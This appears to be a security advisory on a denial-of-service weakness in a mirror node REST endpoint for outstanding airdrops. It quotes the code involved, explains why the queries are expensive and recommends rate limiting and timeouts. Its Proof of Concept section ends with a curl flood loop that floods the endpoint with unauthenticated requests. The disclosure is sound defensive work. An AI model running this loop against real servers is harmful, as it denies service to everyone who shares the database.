### Title
Unauthenticated Resource Exhaustion via Maximally-Bounded Multi-Range Query in `getOutstandingAirdrops()`

### Summary
The `/api/v1/accounts/{id}/airdrops/outstanding` endpoint accepts up to two `receiver.id` range parameters and two `token.id` range parameters simultaneously with no authentication and no rate limiting in the `rest-java` module. When combined with `limit=100` (MAX_LIMIT), the `getBoundConditions` logic generates a complex three-part OR SQL condition (lower-outer + middle + upper-outer, each with nested secondary bounds), forcing the database to perform a wide, multi-predicate scan. An unprivileged attacker can repeatedly issue such requests to exhaust database resources.

### Finding Description

**Controller entry point** — `TokenAirdropsController.java` lines 67–75:
```
@GetMapping(value = "/outstanding")
TokenAirdropsResponse getOutstandingAirdrops(
    @PathVariable EntityIdParameter id,
    @RequestParam(defaultValue = DEFAULT_LIMIT) @Positive @Max(MAX_LIMIT) int limit,
    @RequestParam(defaultValue = "asc") Sort.Direction order,
    @RequestParam(name = RECEIVER_ID, required = false) @Size(max = 2) EntityIdRangeParameter[] receiverIds,
    @RequestParam(name = SERIAL_NUMBER, required = false) @Size(max = 2) NumberRangeParameter[] serialNumbers,
    @RequestParam(name = TOKEN_ID, required = false) @Size(max = 2) EntityIdRangeParameter[] tokenIds)
```
No authentication annotation, no rate-limiting interceptor. `MAX_LIMIT = 100` (`Constants.java` line 35). `@Size(max=2)` permits two range parameters per field.

**Query construction** — `TokenAirdropRepositoryCustomImpl.java` lines 58–72:
```java
var condition = getBaseCondition(accountId, type.getBaseField())
        .and(getBoundConditions(bounds))
        .and(TOKEN_AIRDROP.STATE.eq(AirdropState.PENDING));
...
.limit(request.getLimit())
.fetchInto(TokenAirdrop.class);
```
The `LIMIT` clause only caps *returned rows*, not the rows the DB must scan to satisfy the query.

**Condition explosion** — `JooqRepository.java` lines 67–92: `getBoundConditions` recursively generates three OR branches for every primary bound that has both a lower and upper value:
- Lower outer condition (primary EQ lower-bound AND nested secondary bounds)
- Middle condition (primary GT lower AND primary LT upper, plus any EQ secondary bounds)
- Upper outer condition (primary EQ upper-bound AND nested secondary bounds)

With `receiver.id=gte:1&receiver.id=lte:999999999` and `token.id=gte:1&token.id=lte:999999999`, the generated SQL becomes:
```sql
WHERE sender_account_id = X
  AND STATE = 'PENDING'
  AND (
    (receiver_account_id = 1 AND (token_id >= 1))
    OR (receiver_account_id > 1 AND receiver_account_id < 999999999)
    OR (receiver_account_id = 999999999 AND (token_id <= 999999999))
  )
LIMIT 100
```
This multi-branch OR prevents the database from using a tight composite index range scan; it must evaluate all three branches across the full receiver range for the given sender.

**No rate limiting in rest-java**: The throttle infrastructure (`ThrottleManagerImpl`, `ThrottleConfiguration`, `RequestFilter`) exists exclusively in the `web3` module. No equivalent exists for `rest-java` controllers.

### Impact Explanation
An attacker can drive repeated maximally-expensive queries against the `token_airdrop` table with zero authentication. Each request forces a wide OR-branch scan across potentially millions of rows for a popular sender account. At scale (many concurrent attackers or a single fast loop), this saturates DB CPU and I/O, degrading or denying service for all users of the mirror node REST API. Severity: **High** (unauthenticated DoS against shared DB infrastructure).

### Likelihood Explanation
The endpoint is public, requires no credentials, and the exploit requires only a standard HTTP client. The parameters needed (`limit=100`, two `receiver.id` ranges, two `token.id` ranges) are documented query parameters. Any attacker who reads the API spec can construct the request. It is trivially repeatable in a loop or via a botnet. Likelihood: **High**.

### Recommendation
1. **Add rate limiting to `rest-java`**: Apply a per-IP or global request-rate filter (analogous to `ThrottleManagerImpl` in `web3`) to all `rest-java` controllers, including `TokenAirdropsController`.
2. **Add DB query timeout**: Configure a statement timeout (e.g., via jOOQ's `queryTimeout` or a datasource property) so runaway queries are killed server-side.
3. **Restrict combined range parameters**: When both `receiver.id` and `token.id` are supplied as open ranges (not equality), reject or warn; require at least one equality-bound parameter to keep the scan selective.
4. **Index review**: Ensure a composite index on `(sender_account_id, receiver_account_id, token_id, serial_number, state)` exists so the base equality condition is maximally selective before range evaluation.

### Proof of Concept
```bash
# Maximally expensive outstanding airdrop query — no auth required
curl -s "https://<mirror-node>/api/v1/accounts/0.0.1234/airdrops/outstanding?\
limit=100\
&receiver.id=gte:0.0.1\
&receiver.id=lte:0.0.9999999999\
&token.id=gte:0.0.1\
&token.id=lte:0.0.9999999999"

# Flood loop (bash)
while true; do
  curl -s "https://<mirror-node>/api/v1/accounts/0.0.1234/airdrops/outstanding?\
limit=100&receiver.id=gte:0.0.1&receiver.id=lte:0.0.9999999999\
&token.id=gte:0.0.1&token.id=lte:0.0.9999999999" &
done
```
Each iteration issues a full multi-branch OR scan against the `token_airdrop` table. With no rate limiting in `rest-java`, the server accepts every request and forwards it to the database.
